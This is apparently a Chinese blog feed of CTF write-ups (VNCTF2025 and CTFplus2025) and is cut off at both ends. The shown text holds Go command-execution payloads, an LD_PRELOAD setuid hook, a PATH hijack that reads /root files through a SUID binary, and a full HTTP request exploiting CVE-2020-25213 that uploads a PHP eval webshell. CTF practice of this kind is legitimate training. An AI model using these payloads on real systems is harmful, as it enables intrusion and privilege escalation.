class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error reading file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Read %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;flag 的内容是<code>VNCTF2025!!!</code></p><p>尝试用cgo执行命令</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token comment">/*#include &lt;stdio.h>#include &lt;stdlib.h>void execute() &#123;    system("ls />/GinTest/uploads/1.txt");&#125;*/</span><span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"C"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>C<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回<code>go: no Go source files</code>，寄了</p><p>看下环境变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable">SUDO_GID</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>ret2shell-47-1447<span class="token assign-left variable">SUDO_COMMAND</span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable">SUDO_USER</span><span class="token operator">=</span>root<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/GinTest<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>ctfer<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home/ctfer<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>unknown<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>ctfer<span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://proxy.golang.org,direct<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin<span class="token assign-left variable">SUDO_UID</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">MAIL</span><span class="token operator">=</span>/var/mail/ctfer<span class="token assign-left variable"><span class="token environment constant">OLDPWD</span></span><span class="token operator">=</span>/home/ctfer<span class="token assign-left variable">_</span><span class="token operator">=</span>./GinTest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试只使用 os&#x2F;exec 命令执行：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"os/exec"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"ls />/GinTest/uploads/1.txt"</span><span class="token punctuation">)</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回500，最后发现import这里必须要有<code>()</code></p><p>发现可以拉 goeval 依赖来命令执行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/PaulXu-cn/goeval"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Package <span class="token operator">:=</span> <span class="token string">"\"os/exec\"\n fmt\"\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\"ls\",\"/\")\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\"1"</span>eval<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> goeval<span class="token punctuation">.</span><span class="token function">Eval</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"fmt.Println(\"\")"</span><span class="token punctuation">,</span> Package<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208204029737.png" alt="image-20250208204029737"></p><h3 id="预期RCE"><a href="#预期RCE" class="headerlink" title="预期RCE"></a>预期RCE</h3><p>预期应该是正则只匹配第一个 import，那么多一个 import 就行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"os/exec"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">)</span>out<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>然后尝试find提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/umount/usr/bin/chfn/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/su/usr/bin/mount/usr/bin/sudo/<span class="token punctuation">..</span>./Cat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208205327639.png" alt="image-20250208205327639"></p><p>？base64 dump 这个文件下来反编译看一下</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208210120521.png" alt="image-20250208210120521"></p><p>🤔</p><p>首先会执行 <code>setuid(0)</code> 和 <code>setgid(0)</code>进行提权</p><p>看一下进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 /bin/bash /root/start.shmysql       <span class="token number">41</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 /bin/sh /usr/bin/mysqld_safemysql      <span class="token number">188</span>    <span class="token number">41</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:02 /usr/sbin/mysqld <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/var/lib/mysql --plugin-dir<span class="token operator">=</span>/usr/lib/mysql/plugin --log-error<span class="token operator">=</span>/var/log/mysql/error.log --pid-file<span class="token operator">=</span>ret2shell-47-1447.pidroot       <span class="token number">273</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 <span class="token function">sudo</span> <span class="token parameter variable">-u</span> ctfer <span class="token parameter variable">-i</span>ctfer      <span class="token number">274</span>   <span class="token number">273</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 <span class="token parameter variable">-bash</span>ctfer      <span class="token number">276</span>   <span class="token number">274</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 ./GinTestctfer     <span class="token number">2739</span>   <span class="token number">276</span>  <span class="token number">8</span> <span class="token number">13</span>:12 ?        00:00:00 go run /tmp/goeval-2979922160.goctfer     <span class="token number">2906</span>  <span class="token number">2739</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 /tmp/go-build1797982035/b001/exe/goeval-2979922160ctfer     <span class="token number">2911</span>  <span class="token number">2906</span> <span class="token number">23</span> <span class="token number">13</span>:12 ?        00:00:00 go run /tmp/cremquog/main.goctfer     <span class="token number">3094</span>  <span class="token number">2911</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 /tmp/go-build898556976/b001/exe/mainctfer     <span class="token number">3099</span>  <span class="token number">3094</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 <span class="token function">ps</span> <span class="token parameter variable">-ef</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有需要注意的</p><p>想了一下，可能需要劫持命令，准备so文件</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span>\"<span class="token operator">/</span>bin<span class="token operator">/</span>sh\"<span class="token punctuation">,</span>\"<span class="token operator">-</span>c\"<span class="token punctuation">,</span>\"export LD_PRELOAD<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>evil<span class="token punctuation">.</span>so<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">...</span><span class="token operator">/</span>Cat<span class="token punctuation">;</span>id\"<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>失败</p><p>参考：<a href="https://pankas.top/2022/12/12/rctf-web/#%E7%A4%BA%E4%BE%8B">https://pankas.top/2022/12/12/rctf-web/#%E7%A4%BA%E4%BE%8B</a></p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208233641216.png" alt="image-20250208233641216"></p><p>但是 &#x2F;etc 文件夹没写权限，寄</p><br><p>结合ida反编译的结果，考虑劫持setuid</p><p>hook.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">setuid</span><span class="token punctuation">(</span>__uid_t __uid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250209000601002.png" alt="image-20250209000601002"></p><p>本地通了远程没通。。。</p><br><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p>参考：<a href="https://www.cnblogs.com/1vxyz/articles/17659773.html">https://www.cnblogs.com/1vxyz/articles/17659773.html</a></p><p>原来直接环境变量劫持 cat 就能实现提权，因为这里没用 &#x2F;bin&#x2F;cat 而是 cat</p><p>直接写个 shell 到 &#x2F;tmp 下，然后给执行权限写入环境变量，注意这里读取flag要用除了cat以外的命令</p><p>然后在没弹shell的环境下，写入环境变量这一步和执行命令这一步需要一起进行，因为每次执行代码都相当于开启一个新的bash，不继承环境变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">'#!/bin/bash\ntac /root/*'</span> <span class="token operator">></span> /tmp/cat<span class="token function">chmod</span> <span class="token number">777</span> /tmp/cat<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span> <span class="token operator">&amp;&amp;</span> /<span class="token punctuation">..</span>./Cat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212190120892.png" alt="image-20250212190120892"></p><hr><h2 id="ez-emlog（Unsolved）"><a href="#ez-emlog（Unsolved）" class="headerlink" title="ez_emlog（Unsolved）"></a>ez_emlog（Unsolved）</h2><blockquote><p>install.php<br>mt_rand的安全问题</p></blockquote><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h2><p>给了个rust写的程序和源代码</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 渲染文本</span><span class="token comment">// Fake Flag lol</span><span class="token keyword">let</span> text1 <span class="token operator">=</span> <span class="token string">"VNCTF&#123;VNCTF"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text2 <span class="token operator">=</span> <span class="token string">"VNCTFVNCTF"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text3 <span class="token operator">=</span> <span class="token string">"CTFVNCTFVN"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text4 <span class="token operator">=</span> <span class="token string">"VNFTCVNFTC"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text5 <span class="token operator">=</span> <span class="token string">"CTFVNCTFVN&#125;"</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span> <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要知道这里的flag是明文存储在程序就行</p><p>ida shift+f12 秒了</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208110202323.png" alt="image-20250208110202323"></p><p><code>VNCTF&#123;byRXtpYEF6j8bFCQ7Nf7tZ8EDWcG8Xl4kKXds1pOTF1dV&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;完 全 败 北&lt;/p&gt;
&lt;p&gt;去年是遗憾，今年是惨败&lt;/p&gt;
&lt;p&gt;第三年了，本以为今年能打出一个比较满意的成绩，结果web直接爆零了&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/LAMENTXU/articles/18705991&quot;&gt;https://www.cnblogs.com/LAMENTXU/articles/18705991&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.bmth666.cn/2025/02/10/2025-VNCTF-ez-emlog%E5%A4%8D%E7%8E%B0/&quot;&gt;http://www.bmth666.cn/2025/02/10/2025-VNCTF-ez-emlog%E5%A4%8D%E7%8E%B0/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFplus2025新春挑战赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2025-01-28T12:07:30.000Z</published>
    <updated>2025-01-31T08:15:21.674Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>除夕打ctf ver3</p><p>二进制的部分不会啦 _(:3 」∠ )_</p><span id="more"></span><hr><h1 id="入侵分析"><a href="#入侵分析" class="headerlink" title="入侵分析"></a>入侵分析</h1><p>wpscan 加 –force 参数开扫</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> robots.txt found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/robots.txt <span class="token operator">|</span> Interesting Entry: /3ysd8.html <span class="token operator">|</span> Found By: Robots Txt <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress readme found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/readme.html <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Upload directory has listing enabled: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/wp-content/uploads/ <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%Fingerprinting the version - Time: 00:00:57 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">702</span> / <span class="token number">702</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:57<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The WordPress version could not be detected.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span> Checking Config Backups - Time: 00:00:01 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">137</span> / <span class="token number">137</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:01<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK <span class="token operator">|</span> Plan: <span class="token function">free</span> <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">0</span> <span class="token operator">|</span> Requests Remaining: <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3ysd8.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>备忘录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>怕忘了，放这儿，应该没人知道吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- key是  app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;wp-content&#x2F;uploads&#x2F;2025&#x2F;01&#x2F; 下下载到源码</p><p>只发现一个 wpfilemanager.php 比较令人在意，搜一下，有 CVE-2020-25213</p><p>flag：<code>flag&#123;CVE-2020-25213_wp-file-manager&#125;</code></p><p>传马</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">80-c1f4bf17-2a3c-4b73-a278-0c963f55036f.challenge.ctfplus.cn</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=72489tgmnn16aeuar248kim1g8</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">415</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarySkJwlzCQ52IPd8V5</span></span>------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="cmd"</span></span>upload------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="target"</span></span>l1_------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="upload[]";filename="shell.php"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>&lt;?php @eval($_POST[1]);?>------WebKitFormBoundarySkJwlzCQ52IPd8V5--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128203719059.png" alt="image-20250128203719059"></p><hr><h1 id="reverse-加密迷局（Unsolved）"><a href="#reverse-加密迷局（Unsolved）" class="headerlink" title="reverse-加密迷局（Unsolved）"></a>reverse-加密迷局（Unsolved）</h1><p>蚁剑连上去</p><p>发现同目录下config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">rfHWEMTbes0uuYuHJczUCsS2ovroJHKWpYLixdKXtfqPqKWJudyRhqPatqjbjXX1raKshzfaivabqDzicra4yurenZqLgBvqcrqWfKPmu1uUfXaJqKGzDrafvKS4iqHaj0WerGKPfXfgdziEdveByvmUnYjchNXnrHC8aBznxGjEus8Olav8sZq2BBmPvXvwczfgs09wFfzrJGChDfnsuBavBauvqgfqDsOhBXBtwHGQiZqtiKBNpImYftvJga5na0WCfdKNhXngwIzPdDuxaL9sJdKIoxzFDG8ruvfvtXvvoLeDoLjQqtPtrqK2q0ztofvqqtPuAIXtvuCTxurlFLrqvYXwvw0SvLuolv1Ds35ruB4SvfCKlfeurY1erDT<span class="token operator">+</span>uvDElarxjcXvvDCTx0nlFLerhIXtvIqSu1yolv1ds35grGKyBqv8skCKnqKkv0f4paBuhuypJB8BqD1BaI8twDqjDH8BqgyDvriyiuPmphy3nYLqcrqZf0yevKOoJd1HB0yjBaKhFaTgsvrcxa8Mf1BxoKnquqBfuLDQrf5gjHvshkPsrL1HuD9wvL1Av1WvlHCqcKjilGqvaGmcqLCCs0rCuB8VJZ1qxrKvfIG0wK0qcqfqxfa0Ja8AvKTEotnMpuWeBfusmIBgdziEdveBc0Wru0D6vMLBoLBclqXBaN5su1CSvLqafLayJHrCdYyatampfDWAgIq1mtLruuaZEI4drH8sdZTqxrC8aBznxLXDw0yZusGniKjatBmdnGL0rf0DgsCtcLajfBKwsGXAcXmSfzyCrhq6izKpoDOWfuSqBqGfaDa<span class="token 